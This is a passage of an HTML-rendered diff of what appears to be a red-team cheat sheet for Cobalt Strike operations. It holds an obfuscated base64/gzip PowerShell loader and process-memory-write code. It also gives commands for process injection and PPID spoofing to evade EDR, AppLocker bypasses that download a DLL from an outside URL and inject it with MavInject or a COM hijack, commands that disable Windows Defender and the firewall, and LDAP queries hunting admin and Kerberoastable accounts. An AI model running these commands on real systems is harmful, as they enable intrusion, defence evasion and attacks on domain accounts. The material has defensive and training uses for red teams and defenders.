+</span><span class="n">Invoke</span><span class="nt">-Obfuscation</span><span class="w"> </span><span class="o">.</span><span class="n">\cobaltstrike\custom-resources\compress.ps1</span><span class="w">
+</span><span class="c">### Using token obfusacation</span><span class="w">
+</span><span class="n">TOKEN\ALL\1</span><span class="w">
+</span><span class="nx">SET-itEm</span><span class="w">  </span><span class="nx">VarIABLe:WyizE</span><span class="w"> </span><span class="p">([</span><span class="n">tyPe</span><span class="p">](</span><span class="s1">'conVE'</span><span class="o">+</span><span class="s1">'Rt'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w">  </span><span class="n">seT</span><span class="nt">-variAbLe</span><span class="w">  </span><span class="mi">0</span><span class="n">eXs</span><span class="w">  </span><span class="p">(</span><span class="w">  </span><span class="p">[</span><span class="n">tYpe</span><span class="p">](</span><span class="s1">'iO.'</span><span class="o">+</span><span class="s1">'COmp'</span><span class="o">+</span><span class="s1">'Re'</span><span class="o">+</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'SiON.C'</span><span class="o">+</span><span class="s1">'oM'</span><span class="o">+</span><span class="s1">'P'</span><span class="o">+</span><span class="s1">'ResSIonM'</span><span class="o">+</span><span class="s1">'oDE'</span><span class="p">))</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">${s}</span><span class="o">=</span><span class="n">nEW</span><span class="nt">-o</span><span class="err">`</span><span class="n">Bj</span><span class="err">`</span><span class="n">eCt</span><span class="w"> </span><span class="n">IO.</span><span class="err">`</span><span class="n">MemO</span><span class="err">`</span><span class="n">Ry</span><span class="err">`</span><span class="n">St</span><span class="err">`</span><span class="n">REAM</span><span class="p">(,</span><span class="w"> </span><span class="p">(</span><span class="n">VAriABle</span><span class="w"> </span><span class="n">wYIze</span><span class="w"> </span><span class="nt">-val</span><span class="w">  </span><span class="p">)::</span><span class="s2">"FR</span><span class="se">`o</span><span class="s2">mB</span><span class="se">`A</span><span class="s2">sE64s</span><span class="se">`T</span><span class="s2">riNG"</span><span class="p">(</span><span class="s2">"%%DATA%%"</span><span class="p">));</span><span class="n">i</span><span class="se">`E</span><span class="nx">X</span><span class="w"> </span><span class="p">(</span><span class="n">ne</span><span class="err">`</span><span class="n">w-</span><span class="se">`o`B</span><span class="nx">JECT</span><span class="w"> </span><span class="nx">i</span><span class="se">`o</span><span class="o">.</span><span class="nf">sTr</span><span class="se">`E</span><span class="nx">AmRe</span><span class="se">`A</span><span class="nx">DEr</span><span class="p">(</span><span class="n">NEw</span><span class="o">-</span><span class="err">`</span><span class="n">O</span><span class="se">`B</span><span class="nx">Je</span><span class="se">`C</span><span class="nx">T</span><span class="w"> </span><span class="nx">IO.CO</span><span class="se">`m</span><span class="nx">PrESSi</span><span class="se">`o</span><span class="nx">N.</span><span class="se">`g</span><span class="nx">zI</span><span class="se">`p</span><span class="nx">S</span><span class="se">`T</span><span class="nx">ream</span><span class="p">(</span><span class="nv">${s}</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">vAriable</span><span class="w">  </span><span class="mi">0</span><span class="n">ExS</span><span class="p">)</span><span class="o">.</span><span class="nf">vALUE</span><span class="p">::</span><span class="s2">"Dec</span><span class="se">`o</span><span class="s2">m</span><span class="se">`P</span><span class="s2">ress"</span><span class="p">)))</span><span class="o">.</span><span class="s2">"RE</span><span class="se">`A</span><span class="s2">dT</span><span class="se">`O</span><span class="s2">End"</span><span class="p">();</span><span class="w">
+</span><span class="c">## template.x64.ps1</span><span class="w">
+</span><span class="c">### Names</span><span class="w">
+</span><span class="n">func_get_proc_address</span><span class="w"> </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="n">get_proc_address</span><span class="w"> 
+</span><span class="n">func_get_delegate_type</span><span class="w"> </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="n">get_delegate_type</span><span class="w">
+</span><span class="n">system</span><span class="p">(</span><span class="s1">'system.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="s1">'Sys'</span><span class="o">+</span><span class="s1">'tem.dll'</span><span class="p">)</span><span class="w">  
+</span><span class="c">### Logic L32:33</span><span class="w">
+</span><span class="nv">$var_wpm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">get_proc_address</span><span class="w"> </span><span class="n">kernel32.dll</span><span class="w"> </span><span class="n">WriteProcessMemory</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">get_delegate_type</span><span class="w"> </span><span class="p">@([</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]],</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="n">Bool</span><span class="p">])))</span><span class="w">
+</span><span class="nv">$ok</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$var_wpm</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">New</span><span class="p">(</span><span class="nt">-1</span><span class="p">),</span><span class="w"> </span><span class="nv">$var_buffer</span><span class="p">,</span><span class="w"> </span><span class="nv">$v_code</span><span class="p">,</span><span class="w"> </span><span class="nv">$v_code</span><span class="o">.</span><span class="nf">Count</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">)</span><span class="w">
+</span></pre></table></code></div></div><h3 id="post-ex"><strong>Post Ex</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre><span class="c"># Session Prepping</span><span class="w">
+</span><span class="c">## Once you have an initial shell (cmd.exe / powershell.exe). Migrate out of the initial noisy process (unsafe context) as early as possible to blend in and reduce detection</span><span class="w">
+</span><span class="n">ps</span><span class="w">
+</span><span class="nx">inject</span><span class="w"> </span><span class="nx">9942</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="nx">lon-WS-1</span><span class="w">
+
+</span><span class="c"># spawnto </span><span class="w">
+</span><span class="c">## Change Sacrificial Process that will run as part of the Fork &amp; Run Commands</span><span class="w">
+</span><span class="n">spawnto</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\dllhost.exe</span><span class="w">
+</span><span class="c"># For Psexec; the process that the service will execute during the lateral movement proccess (jump) </span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">updater</span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">spawnto_x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\dllhost.exe</span><span class="w">
+</span><span class="n">ak-settings</span><span class="w"> </span><span class="nx">spawnto_x86</span><span class="w"> </span><span class="nx">C:\Windows\SysWOW64\dllhost.exe</span><span class="w">
+
+</span><span class="c"># Parent-Child relationships </span><span class="w">
+</span><span class="c">## Control which process appears to have spawned another process during fork-and-run operations </span><span class="w">
+</span><span class="c">## Running the post-ex command direclty without PPIP (msedge.exe → rundll32.exe) are strong indicators of malicious activity</span><span class="w">
+</span><span class="c">## while chains such as (msedge.exe → msedge.exe) are common and expected</span><span class="w">
+</span><span class="n">ps</span><span class="w">
+</span><span class="nx">ppid</span><span class="w"> </span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="w">
+</span><span class="n">spawnto</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</span><span class="w">
+
+</span><span class="c"># BlockDLL</span><span class="w">
+</span><span class="c">## Prevent non-Microsoft signed DLLs from being loaded into child processes launched by a Beacon to reduce EDR mointoring for the proccess</span><span class="w">
+</span><span class="n">blockdlls</span><span class="w"> </span><span class="nx">start</span><span class="w">
+
+</span><span class="c"># Image Load Events</span><span class="w">
+</span><span class="c">## Post-Ex injects a DLL into a target process that often needs to load additional Windows libraries to function (PowerShell-based capabilities -&gt; System.Management.Automation.dll)</span><span class="w">
+</span><span class="c">## Detection occurs when a process loads DLLs that do not match its normal behavior (notepad.exe -&gt; System.Management.Automation.dll)</span><span class="w">
+</span><span class="c">## So The selected process must be one that normally loads the same type of libraries required by the post-ex capability.</span><span class="w">
+</span><span class="c">## (explorer.exe -&gt; msiexec.exe -&gt; System.Management.Automation.dll)</span><span class="w">
+</span><span class="n">ps</span><span class="w">
+</span><span class="nx">ppid</span><span class="w"> </span><span class="nx">6648</span><span class="w"> 
+</span><span class="n">spawnto</span><span class="w"> </span><span class="nx">x64</span><span class="w"> </span><span class="nx">C:\Windows\System32\msiexec.exe</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Start-Sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">60</span><span class="w">
+</span></pre></table></code></div></div><h3 id="applocker"><strong>AppLocker</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre><span class="c"># Enumeration</span><span class="w">
+</span><span class="c">## Registery</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s1">'HKLM:Software\Policies\Microsoft\Windows\SrpV2'</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s1">'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'</span><span class="w">
+</span><span class="c">## PowerShell</span><span class="w">
+</span><span class="nv">$policy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w">
+</span><span class="nv">$policy</span><span class="o">.</span><span class="nf">RuleCollections</span><span class="w">
+</span><span class="c">## GPO</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">groupPolicyContainer</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">displayName</span><span class="p">,</span><span class="nx">gPCFileSysPath</span><span class="w">
+</span><span class="n">download</span><span class="w"> </span><span class="nx">\\contoso.com\SysVol\contoso.com\Policies\</span><span class="p">{</span><span class="mi">8</span><span class="n">ECEE926-7FEE-48CD-9F51-493EB5AD95DC</span><span class="p">}</span><span class="n">\Machine\Registry.pol</span><span class="w">
+</span><span class="nx">Parse-PolFile</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\Desktop\Registry.pol</span><span class="w">
+
+</span><span class="c"># Bypasses</span><span class="w">
+</span><span class="c">## Path Wildcards</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">FilePathCondition</span><span class="w"> </span><span class="nx">Path</span><span class="o">=</span><span class="s2">"*\App-V\*"</span><span class="n">/</span><span class="err">&gt;</span><span class="w">
+</span><span class="c">## Writable Directories</span><span class="w">
+</span><span class="n">C:\Windows\Tasks</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">C:\Windows\Temp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">C:\windows\tracing</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">C:\Windows\System32\spool\PRINTERS</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">C:\Windows\System32\spool\SERVERS</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">C:\Windows\System32\spool\drivers\color</span><span class="w">
+</span><span class="c">## LOLBAS</span><span class="w">
+</span><span class="n">msbuild</span><span class="w"> </span><span class="nx">a.csproj</span><span class="w">
+</span><span class="c">## PowerShell CLM</span><span class="w">
+</span><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
+</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WScript.Shell</span><span class="w">
+</span><span class="c">### Creat a custom COM object that will load an arbitrary DLL into the PowerShell process</span><span class="w">
+</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://www.bleepincomputer.com/file</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">c:\windows\tracing\trace.dll</span><span class="w">
+</span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'HKCU:Software\Classes\CLSID'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'</span><span class="w">
+</span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'InprocServer32'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'C:\windows\tracing\trace.dll'</span><span class="w">
+</span><span class="n">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'ThreadingModel'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'Both'</span><span class="w">
+</span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'HKCU:Software\Classes'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'AppLocker.Bypass'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'AppLocker Bypass'</span><span class="w">
+</span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'HKCU:Software\Classes\AppLocker.Bypass'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'CLSID'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'</span><span class="w">
+</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">AppLocker.Bypass</span><span class="w">
+</span><span class="c">## DLLs</span><span class="w">
+</span><span class="n">rundll32</span><span class="w"> </span><span class="nx">bypass.dll</span><span class="p">,</span><span class="nx">execute</span><span class="w">
+</span><span class="n">rundll32</span><span class="w"> </span><span class="nx">bypass.dll</span><span class="p">,</span><span class="nx">StartW</span><span class="w">
+</span><span class="c">## MALVINJECT</span><span class="w">
+</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://www.bleepincomputer.com/file</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">c:\windows\tracing\trace.dll</span><span class="w">
+</span><span class="n">MavInject.exe</span><span class="w"> </span><span class="nx">6688</span><span class="w"> </span><span class="nx">/INJECTRUNNING</span><span class="w"> </span><span class="nx">C:\Windows\tracing\trace.dll</span><span class="w">
+</span></pre></table></code></div></div><h3 id="av--firewall"><strong>AV &amp; Firewall</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="c"># Firewall </span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Get-NetFirewallProfile</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Get-NetFirewallProfile</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Get-NetFirewallRule</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">DisplayName</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="w">
+</span><span class="c">## Add Rule</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">New-NetFirewallRule</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"HTTP-Inbound"</span><span class="w"> </span><span class="nt">-DisplayName</span><span class="w"> </span><span class="s2">"HTTP (TCP-In)"</span><span class="w"> </span><span class="nt">-Enabled</span><span class="w"> </span><span class="nx">True</span><span class="w"> </span><span class="nt">-Direction</span><span class="w"> </span><span class="nx">Inbound</span><span class="w"> </span><span class="nt">-Protocol</span><span class="w"> </span><span class="nx">TCP</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nx">Allow</span><span class="w"> </span><span class="nt">-LocalPort</span><span class="w"> </span><span class="nx">80</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">New-NetFirewallRule</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"HTTP-Outbound"</span><span class="w"> </span><span class="nt">-DisplayName</span><span class="w"> </span><span class="s2">"HTTP (TCP-Out)"</span><span class="w"> </span><span class="nt">-Enabled</span><span class="w"> </span><span class="nx">True</span><span class="w"> </span><span class="nt">-Direction</span><span class="w"> </span><span class="nx">Outbound</span><span class="w"> </span><span class="nt">-Protocol</span><span class="w"> </span><span class="nx">TCP</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nx">Allow</span><span class="w"> </span><span class="nt">-LocalPort</span><span class="w"> </span><span class="nx">80</span><span class="w">
+</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Open Port 28190"</span><span class="w"> </span><span class="n">dir</span><span class="o">=</span><span class="kr">in</span><span class="w"> </span><span class="n">action</span><span class="o">=</span><span class="n">allow</span><span class="w"> </span><span class="nx">protocol</span><span class="o">=</span><span class="n">TCP</span><span class="w"> </span><span class="nx">localport</span><span class="o">=</span><span class="mi">28190</span><span class="w">
+</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Open Port 28190"</span><span class="w"> </span><span class="n">dir</span><span class="o">=</span><span class="n">out</span><span class="w"> </span><span class="nx">action</span><span class="o">=</span><span class="n">allow</span><span class="w"> </span><span class="nx">protocol</span><span class="o">=</span><span class="n">TCP</span><span class="w"> </span><span class="nx">localport</span><span class="o">=</span><span class="mi">28190</span><span class="w">
+</span><span class="c">## Disable firewalls with admin privs - OPSEC falirue</span><span class="w">
+</span><span class="n">Set-NetFirewallProfile</span><span class="w"> </span><span class="nt">-Profile</span><span class="w"> </span><span class="nx">Domain</span><span class="p">,</span><span class="w"> </span><span class="nx">Public</span><span class="p">,</span><span class="w"> </span><span class="nx">Private</span><span class="w"> </span><span class="nt">-Enabled</span><span class="w"> </span><span class="nx">False</span><span class="w">
+
+</span><span class="c"># AV</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Get-MpPreference</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Add-MpPreference</span><span class="w"> </span><span class="nt">-ExclusionPath</span><span class="w"> </span><span class="s2">"C:\Windows\tracing"</span><span class="w">
+</span><span class="c">## Turn off everything and set exclusion to "C:\Windows\Temp" - OPSEC falirue</span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableIOAVProtection</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Set-MPPreference</span><span class="w"> </span><span class="nt">-DisableBehaviorMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Set-MPPreference</span><span class="w"> </span><span class="nt">-DisableBlockAtFirstSeen</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Set-MPPreference</span><span class="w"> </span><span class="nt">-DisableEmailScanning</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Set-MPPReference</span><span class="w"> </span><span class="nt">-DisableScriptScanning</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableIOAVProtection</span><span class="w"> </span><span class="bp">$true</span><span class="p">;</span><span class="n">Add-MpPreference</span><span class="w"> </span><span class="nt">-ExclusionPath</span><span class="w"> </span><span class="s2">"C:\Windows\Temp"</span><span class="w">
+</span></pre></table></code></div></div><h2 id="enumeration"><strong>Enumeration</strong></h2><h3 id="ldap"><strong>LDAP</strong></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre><td class="rouge-code"><pre><span class="c"># Filters</span><span class="w">
+</span><span class="c">## SAM_NORMAL_USER_ACCOUNT</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)</span><span class="w">
+</span><span class="c">## Group</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">268435456</span><span class="p">)</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">cn</span><span class="o">=</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="p">)</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="s2">"(&amp;(objectClass=group)(sAMAccountName=Enterprise Admins))"</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">ObjectSid</span><span class="p">,</span><span class="nx">samaccountname</span><span class="w"> </span><span class="nt">--hostname</span><span class="w"> </span><span class="nx">lon-dc-1.contoso.com</span><span class="w"> </span><span class="nt">--dn</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">contoso</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">com</span><span class="w">
+</span><span class="c">## Computer</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)</span><span class="w">
+</span><span class="c">## Domain</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">536870912</span><span class="p">)</span><span class="w">
+</span><span class="c">## GPO</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">groupPolicyContainer</span><span class="p">)</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">displayName</span><span class="p">,</span><span class="nx">gPCFileSysPath</span><span class="w">
+</span><span class="c">## SID</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">objectSid</span><span class="o">=</span><span class="n">SID</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># &amp; | !</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="n">adminCount</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="o">|</span><span class="p">(</span><span class="n">description</span><span class="o">=*</span><span class="n">admin</span><span class="o">*</span><span class="p">)(</span><span class="n">samaccountname</span><span class="o">=*</span><span class="n">adm</span><span class="o">*</span><span class="p">)))</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="n">adminCount</span><span class="o">=</span><span class="mi">1</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">krbtgt</span><span class="p">)))</span><span class="w">
+
+</span><span class="c"># Attributes </span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="n">adminCount</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="nx">memberof</span><span class="p">,</span><span class="nx">ntsecuritydescriptor</span><span class="w">
+
+</span><span class="c"># Bitwise Filters</span><span class="w">
+</span><span class="c">## bitwise AND allows you to query whether a particular flag is set or not</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306369</span><span class="p">)(</span><span class="n">userAccountControl:1.2.840.113556.1.4.803:</span><span class="o">=</span><span class="mi">524288</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samaccountname</span><span class="w">
+</span><span class="nx">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="n">userAccountControl:1.2.840.113556.1.4.803:</span><span class="o">=</span><span class="mi">4194304</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="n">samaccountname</span><span class="w"> </span><span class="c"># Kerberostable account - Not OPSEC safe</span><span class="w">
+</span><span class="c">## bitwise OR - any of both flags set (Disabled + LOCKED) (2+16=18)</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="n">userAccountControl:1.2.840.113556.1.4.804:</span><span class="o">=</span><span class="mi">18</span><span class="p">)</span><span class="w">
+</span><span class="c">## LDAP_MATCHING_RULE_IN_CHAIN - querying the ancestry of an object, which becomes useful when needing to unroll groups of groups </span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="s2">"(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=contoso,DC=com)"</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">
+
+</span><span class="c"># SPNs</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">samAccountType</span><span class="o">=</span><span class="mi">805306368</span><span class="p">)(</span><span class="n">servicePrincipalName</span><span class="o">=</span><span class="n">MSSQLSvc</span><span class="o">*</span><span class="p">))</span><span class="w"> </span><span class="nt">--attributes</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">samAccountName</span><span class="p">,</span><span class="nx">servicePrincipalName</span><span class="w"> 
+
+</span><span class="c"># Trusts</span><span class="w">
+</span><span class="c">## Trust Properties</span><span class="w">
